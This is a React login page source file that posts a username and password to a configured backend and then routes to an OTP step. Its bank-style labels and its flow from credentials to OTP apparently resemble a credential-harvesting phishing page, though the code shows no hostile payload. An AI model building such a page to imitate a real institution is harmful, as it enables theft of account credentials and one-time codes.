import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";
import { FaEye, FaEyeSlash } from "react-icons/fa";
import "../styles/home.css";

const countryCodes = [{ code: "+63", country: "Philippines" }];

// Validation schema
const schema = yup.object().shape({
  username: yup.string().required("Username  is required"),
  password: yup.string().required("Password is required"),
});

const Home = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
 
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const submitForm = (data) => {
    setLoading(true);

    axios
      .post(`${BASE_URL}/`, data)
      .then((response) => {
        console.log(response.data);
        navigate("/otp");
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  return (
    <div className="home-container">
      {/* Logo */}
      <div className="h1">Log In</div>

      <form onSubmit={handleSubmit(submitForm)} className="form-wrapper">
        {/* Phone Number Input */}
        <div className="form-group">
          <label htmlFor="username" className="form-label">
            Username
          </label>
          <div className="input-container">
            <input
              name="username"
              placeholder="Enter username"
              type="text"
              required
              className="form-input"
              {...register("username")}
            />
          </div>
          <FormErrMsg errors={errors} inputName="username" />
        </div>

        {/* Password Input */}
        <div className="form-group">
          <label htmlFor="password" className="form-label">
            Password
          </label>
          <div className="input-container">
            <input
              name="password"
              type={showPassword ? "text" : "password"}
              placeholder="Enter password"
              required
              className="form-input"
              {...register("password")}
            />
            <div
              onClick={togglePasswordVisibility}
              className="password-toggle-icon"
            >
              {showPassword ? <FaEyeSlash /> : <FaEye />}
            </div>
          </div>
          <FormErrMsg errors={errors} inputName="password" />
        </div>

        {/* Forgot Password */}
        <div className="forgot-password">
          <a href="#" className="forgot-password-link">
            Forgot my User ID or Password
          </a>

          <div className="link">Unblock my Profile</div>
        </div>

        {/* Submit Button */}
        <button type="submit" className="submit-button" disabled={loading}>
          {loading ? "Loading..." : "Log in"}
        </button>
      </form>
    </div>
  );
};

export default Home;
